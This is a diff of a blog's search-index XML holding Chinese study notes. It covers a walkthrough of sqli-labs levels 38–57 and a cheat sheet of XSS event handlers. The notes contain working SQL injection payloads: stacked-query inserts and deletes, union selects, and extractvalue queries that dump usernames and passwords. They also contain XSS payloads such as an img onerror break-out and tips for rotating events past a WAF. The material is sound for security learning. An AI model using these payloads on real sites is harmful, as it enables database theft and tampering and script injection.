+<p> 38 是新知识点「堆叠注入」，专门切换到<code>mysqli</code>这套 API，<strong>直接在本页面写连接代码，清晰展示 mysqli 整套调用</strong>，用来教学。</p>
+</li>
+<li><p>设计考察点：</p>
+<p> 考察审计的时候，能认出<code>mysqli_multi_query</code>，理解它依赖 mysqli 连接，支持分号多条 SQL。</p>
+</li>
+</ol>
+<h2 id="39"><a href="#39" class="headerlink" title="39"></a>39</h2><p>与38相同，只是没有闭合</p>
+<h2 id="40"><a href="#40" class="headerlink" title="40"></a>40</h2><p>40为’)闭合<br>?id&#x3D;1&amp;id&#x3D;0‘) union select 1,2,group_concat(username) from users –+</p>
+<h2 id="41"><a href="#41" class="headerlink" title="41"></a>41</h2><p>?id&#x3D;1&amp;id&#x3D;0 union select 1,2,group_concat(username) from users –+</p>
+<h2 id="42"><a href="#42" class="headerlink" title="42"></a>42</h2><p>注入点在password<br>‘ ;insert into users(username,password) values(‘zsy’,’520’);#<br>‘ ;delete from users where username&#x3D;’zsy’;#</p>
+<h2 id="43"><a href="#43" class="headerlink" title="43"></a>43</h2><p>同42，变为’)闭合</p>
+<h2 id="44"><a href="#44" class="headerlink" title="44"></a>44</h2><p>没报错了，单引号闭合</p>
+<h2 id="45"><a href="#45" class="headerlink" title="45"></a>45</h2><p>‘)闭合</p>
+<h2 id="46"><a href="#46" class="headerlink" title="46"></a>46</h2><p>?sort&#x3D;1%20and%20extractvalue(1,concat(0x7e,substring((select%20group_concat(username,%27:%27,password)%20from%20users),1,30))) –+</p>
+<h2 id="47"><a href="#47" class="headerlink" title="47"></a>47</h2><p>?sort&#x3D;1%27%20and%20extractvalue(1,concat(0x7e,substring((select%20group_concat(username,%27:%27,password)%20from%20users),1,30)))%20–+</p>
+<h2 id="48"><a href="#48" class="headerlink" title="48"></a>48</h2><p>用盲注的方法，懒得写了</p>
+<h2 id="49"><a href="#49" class="headerlink" title="49"></a>49</h2><p>同样的变成了字符型而已</p>
+<h2 id="50"><a href="#50" class="headerlink" title="50"></a>50</h2><p>?sort&#x3D;1;insert into users(id,username,password) values(15,’zsy’,’520’);–+</p>
+<h2 id="51"><a href="#51" class="headerlink" title="51"></a>51</h2><p>同50，加单引号闭合</p>
+<h2 id="52"><a href="#52" class="headerlink" title="52"></a>52</h2><p>同50，无报错</p>
+<h2 id="53"><a href="#53" class="headerlink" title="53"></a>53</h2><p>同52，加单引号闭合</p>
+<h1 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h1><h2 id="54"><a href="#54" class="headerlink" title="54"></a>54</h2><p>头一次打挑战关卡，感觉有意思多了<br>数字型 union，没什么难度</p>
+<h2 id="55"><a href="#55" class="headerlink" title="55"></a>55</h2><p>加了()闭合，</p>
+<h2 id="56"><a href="#56" class="headerlink" title="56"></a>56</h2><p>单引号闭合</p>
+<h2 id="57"><a href="#57" class="headerlink" title="57"></a>57</h2>]]></content>
+      <categories>
+        <category>技术</category>
+        <category>基础漏洞</category>
+        <category>SQLi</category>
+      </categories>
+      <tags>
+        <tag>sql靶场</tag>
       </tags>
   </entry>
   <entry>
@@ -1359,6 +2280,77 @@
       </categories>
   </entry>
   <entry>
+    <title>XSS 高频事件</title>
+    <url>/2026/11/05/%E6%8A%80%E6%9C%AF/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/XSS/XSS%20%E9%AB%98%E9%A2%91%E4%BA%8B%E4%BB%B6/</url>
+    <content><![CDATA[<span id="more"></span>
+<h1 id="XSS-高频事件（"><a href="#XSS-高频事件（" class="headerlink" title="XSS 高频事件（"></a>XSS 高频事件（</h1><blockquote>
+<p>场景：<code>&lt; &gt;</code>被过滤，不能注入<code>&lt;script&gt;</code>标签，<strong>只能给已有 HTML 标签追加事件属性</strong>，事件触发就执行 JS。</p>
+</blockquote>
+<h2 id="鼠标事件（最常用，level3-就是这类）"><a href="#鼠标事件（最常用，level3-就是这类）" class="headerlink" title="鼠标事件（最常用，level3 就是这类）"></a>鼠标事件（最常用，level3 就是这类）</h2><ul>
+<li><code>onclick</code>：鼠标<strong>单击</strong>元素触发（level3 用的）</li>
+<li><code>ondblclick</code>：鼠标<strong>双击</strong>触发</li>
+<li><code>onmouseover</code>：鼠标<strong>悬浮放上去</strong>就触发（推荐，不用点击）</li>
+<li><code>onmouseout</code>：鼠标<strong>移开</strong>元素触发</li>
+<li><code>onmousemove</code>：鼠标在元素上移动持续触发</li>
+<li><code>oncontextmenu</code>：<strong>右键菜单</strong>（右键点击）触发</li>
+</ul>
+<h2 id="焦点-键盘事件（input-输入框神器，XSSlab-高频）"><a href="#焦点-键盘事件（input-输入框神器，XSSlab-高频）" class="headerlink" title="焦点 &#x2F; 键盘事件（input 输入框神器，XSSlab 高频）"></a>焦点 &#x2F; 键盘事件（input 输入框神器，XSSlab 高频）</h2><ul>
+<li><code>onfocus</code>：元素<strong>获得焦点</strong>（点进输入框）触发</li>
+<li><code>onblur</code>：元素<strong>失去焦点</strong>（点别处）触发</li>
+<li><code>onkeydown</code>：按下按键瞬间触发</li>
+<li><code>onkeyup</code>：松开按键触发</li>
+<li><code>onkeypress</code>：按键按下并产生字符时触发</li>
+</ul>
+<h2 id="加载-错误事件（可以页面加载自动执行，不需要用户交互！重点）"><a href="#加载-错误事件（可以页面加载自动执行，不需要用户交互！重点）" class="headerlink" title="加载 &#x2F; 错误事件（可以页面加载自动执行，不需要用户交互！重点）"></a>加载 &#x2F; 错误事件（可以页面加载自动执行，不需要用户交互！重点）</h2><blockquote>
+<p>这类最好用，不用用户点、不用悬浮，页面渲染直接弹</p>
+</blockquote>
+<ul>
+<li><code>onload</code>：<strong>元素加载成功</strong>触发（img、svg、iframe、body）</li>
+<li><code>onerror</code>：<strong>元素加载失败</strong>触发，最经典！</li>
+</ul>
+<blockquote>
+<p>示例：<code>&lt;img src=x onerror=alert(1)&gt;</code> src&#x3D;x 图片不存在，直接执行 JS</p>
+</blockquote>
+<ul>
+<li><code>onpageshow</code>：页面展示时触发（body）</li>
+</ul>
+<h2 id="表单、内容事件"><a href="#表单、内容事件" class="headerlink" title="表单、内容事件"></a>表单、内容事件</h2><ul>
+<li><code>onchange</code>：输入框内容改变、下拉框切换触发</li>
+<li><code>onselect</code>：选中输入框里面文字时触发</li>
+<li><code>oncopy</code>：复制内容触发</li>
+<li><code>oncut</code>：剪切内容触发</li>
+<li><code>onpaste</code>：粘贴内容触发</li>
+</ul>
+<h2 id="HTML5-新事件（过滤严格靶场备选）"><a href="#HTML5-新事件（过滤严格靶场备选）" class="headerlink" title="HTML5 新事件（过滤严格靶场备选）"></a>HTML5 新事件（过滤严格靶场备选）</h2><ul>
+<li><code>ontoggle</code>：<code>&lt;details&gt;</code>折叠面板展开 &#x2F; 收起触发</li>
+<li><code>onstart</code>：<code>&lt;marquee&gt;</code>滚动标签启动触发</li>
+</ul>
+<hr>
+<h1 id="两个重要分类（实战区分）"><a href="#两个重要分类（实战区分）" class="headerlink" title="两个重要分类（实战区分）"></a>两个重要分类（实战区分）</h1><ol>
+<li><strong>需要用户交互</strong>：<code>onclick / onmouseover / onfocus</code>（level3 用的，必须用户做动作）</li>
+<li><strong>无交互自动执行</strong>：<code>onerror、onload</code>（优先选！不需要用户点击，访问页面直接触发）</li>
+</ol>
+<blockquote>
+<p>举 onerror 例子：</p>
+<p>payload：<code>&#39;&gt;&lt;img src=x onerror=alert(1)//</code></p>
+<p>原理：图片地址<code>x</code>不存在，触发 onerror，自动执行 alert，不用任何点击。</p>
+</blockquote>
+<h2 id="靶场使用小规则（审计-payload-思路）"><a href="#靶场使用小规则（审计-payload-思路）" class="headerlink" title="靶场使用小规则（审计 payload 思路）"></a>靶场使用小规则（审计 payload 思路）</h2><ol>
+<li>上下文是 input 输入框：优先 <code>onfocus onmouseover onclick</code></li>
+<li>可以注入 img&#x2F;svg 标签：优先 <code>onerror / onload</code>，<strong>免交互</strong></li>
+<li>单引号闭合属性：payload 用 <code>&#39; 事件名=alert(1)//</code></li>
+<li>双引号闭合属性：payload 用 <code>&quot; 事件名=alert(1)//</code></li>
+</ol>
+<h2 id="避坑提醒"><a href="#避坑提醒" class="headerlink" title="避坑提醒"></a>避坑提醒</h2><p>很多 WAF 会拦截常见事件，遇到过滤可以轮换试：</p>
+<p><code>onmouseover</code>被拦 → 换<code>onfocus</code>；<code>onerror</code>被拦 → 换<code>onload</code></p>
+]]></content>
+      <categories>
+        <category>技术</category>
+        <category>基础漏洞</category>
+        <category>XSS</category>
+      </categories>
+  </entry>
+  <entry>
     <title>XSS深化总结</title>
     <url>/2026/11/05/%E6%8A%80%E6%9C%AF/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/XSS/XSS%E6%B7%B1%E5%8C%96%E6%80%BB%E7%BB%93/</url>
     <content><![CDATA[<span id="more"></span>
@@ -1455,77 +2447,6 @@
 <p><strong>修复写法</strong>：替换安全DOM API，禁止解析HTML</p>
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">let</span> name = location.<span class="property">search</span>.<span class="title function_">split</span>(<span class="string">&#x27;name=&#x27;</span>)[<span class="number">1</span>];</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 安全写法：innerText仅渲染纯文本，不解析标签、事件</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;box&quot;</span>).<span class="property">innerText</span> = name;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-]]></content>
-      <categories>
-        <category>技术</category>
-        <category>基础漏洞</category>
-        <category>XSS</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>XSS 高频事件</title>
-    <url>/2026/11/05/%E6%8A%80%E6%9C%AF/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/XSS/XSS%20%E9%AB%98%E9%A2%91%E4%BA%8B%E4%BB%B6/</url>
-    <content><![CDATA[<span id="more"></span>
-<h1 id="XSS-高频事件（"><a href="#XSS-高频事件（" class="headerlink" title="XSS 高频事件（"></a>XSS 高频事件（</h1><blockquote>
-<p>场景：<code>&lt; &gt;</code>被过滤，不能注入<code>&lt;script&gt;</code>标签，<strong>只能给已有 HTML 标签追加事件属性</strong>，事件触发就执行 JS。</p>
-</blockquote>
-<h2 id="鼠标事件（最常用，level3-就是这类）"><a href="#鼠标事件（最常用，level3-就是这类）" class="headerlink" title="鼠标事件（最常用，level3 就是这类）"></a>鼠标事件（最常用，level3 就是这类）</h2><ul>
-<li><code>onclick</code>：鼠标<strong>单击</strong>元素触发（level3 用的）</li>
-<li><code>ondblclick</code>：鼠标<strong>双击</strong>触发</li>
-<li><code>onmouseover</code>：鼠标<strong>悬浮放上去</strong>就触发（推荐，不用点击）</li>
-<li><code>onmouseout</code>：鼠标<strong>移开</strong>元素触发</li>
-<li><code>onmousemove</code>：鼠标在元素上移动持续触发</li>
-<li><code>oncontextmenu</code>：<strong>右键菜单</strong>（右键点击）触发</li>
-</ul>
-<h2 id="焦点-键盘事件（input-输入框神器，XSSlab-高频）"><a href="#焦点-键盘事件（input-输入框神器，XSSlab-高频）" class="headerlink" title="焦点 &#x2F; 键盘事件（input 输入框神器，XSSlab 高频）"></a>焦点 &#x2F; 键盘事件（input 输入框神器，XSSlab 高频）</h2><ul>
-<li><code>onfocus</code>：元素<strong>获得焦点</strong>（点进输入框）触发</li>
-<li><code>onblur</code>：元素<strong>失去焦点</strong>（点别处）触发</li>
-<li><code>onkeydown</code>：按下按键瞬间触发</li>
-<li><code>onkeyup</code>：松开按键触发</li>
-<li><code>onkeypress</code>：按键按下并产生字符时触发</li>
-</ul>
-<h2 id="加载-错误事件（可以页面加载自动执行，不需要用户交互！重点）"><a href="#加载-错误事件（可以页面加载自动执行，不需要用户交互！重点）" class="headerlink" title="加载 &#x2F; 错误事件（可以页面加载自动执行，不需要用户交互！重点）"></a>加载 &#x2F; 错误事件（可以页面加载自动执行，不需要用户交互！重点）</h2><blockquote>
-<p>这类最好用，不用用户点、不用悬浮，页面渲染直接弹</p>
-</blockquote>
-<ul>
-<li><code>onload</code>：<strong>元素加载成功</strong>触发（img、svg、iframe、body）</li>
-<li><code>onerror</code>：<strong>元素加载失败</strong>触发，最经典！</li>
-</ul>
-<blockquote>
-<p>示例：<code>&lt;img src=x onerror=alert(1)&gt;</code> src&#x3D;x 图片不存在，直接执行 JS</p>
-</blockquote>
-<ul>
-<li><code>onpageshow</code>：页面展示时触发（body）</li>
-</ul>
-<h2 id="表单、内容事件"><a href="#表单、内容事件" class="headerlink" title="表单、内容事件"></a>表单、内容事件</h2><ul>
-<li><code>onchange</code>：输入框内容改变、下拉框切换触发</li>
-<li><code>onselect</code>：选中输入框里面文字时触发</li>
-<li><code>oncopy</code>：复制内容触发</li>
-<li><code>oncut</code>：剪切内容触发</li>
-<li><code>onpaste</code>：粘贴内容触发</li>
-</ul>
-<h2 id="HTML5-新事件（过滤严格靶场备选）"><a href="#HTML5-新事件（过滤严格靶场备选）" class="headerlink" title="HTML5 新事件（过滤严格靶场备选）"></a>HTML5 新事件（过滤严格靶场备选）</h2><ul>
-<li><code>ontoggle</code>：<code>&lt;details&gt;</code>折叠面板展开 &#x2F; 收起触发</li>
-<li><code>onstart</code>：<code>&lt;marquee&gt;</code>滚动标签启动触发</li>
-</ul>
-<hr>
-<h1 id="两个重要分类（实战区分）"><a href="#两个重要分类（实战区分）" class="headerlink" title="两个重要分类（实战区分）"></a>两个重要分类（实战区分）</h1><ol>
-<li><strong>需要用户交互</strong>：<code>onclick / onmouseover / onfocus</code>（level3 用的，必须用户做动作）</li>
-<li><strong>无交互自动执行</strong>：<code>onerror、onload</code>（优先选！不需要用户点击，访问页面直接触发）</li>
-</ol>
-<blockquote>
-<p>举 onerror 例子：</p>
-<p>payload：<code>&#39;&gt;&lt;img src=x onerror=alert(1)//</code></p>
-<p>原理：图片地址<code>x</code>不存在，触发 onerror，自动执行 alert，不用任何点击。</p>
-</blockquote>
-<h2 id="靶场使用小规则（审计-payload-思路）"><a href="#靶场使用小规则（审计-payload-思路）" class="headerlink" title="靶场使用小规则（审计 payload 思路）"></a>靶场使用小规则（审计 payload 思路）</h2><ol>
-<li>上下文是 input 输入框：优先 <code>onfocus onmouseover onclick</code></li>
-<li>可以注入 img&#x2F;svg 标签：优先 <code>onerror / onload</code>，<strong>免交互</strong></li>
-<li>单引号闭合属性：payload 用 <code>&#39; 事件名=alert(1)//</code></li>
-<li>双引号闭合属性：payload 用 <code>&quot; 事件名=alert(1)//</code></li>
-</ol>
-<h2 id="避坑提醒"><a href="#避坑提醒" class="headerlink" title="避坑提醒"></a>避坑提醒</h2><p>很多 WAF 会拦截常见事件，遇到过滤可以轮换试：</p>
-<p><code>onmouseover</code>被拦 → 换<code>onfocus</code>；<code>onerror</code>被拦 → 换<code>onload</code></p>
 ]]></content>
       <categories>
         <category>技术</category>
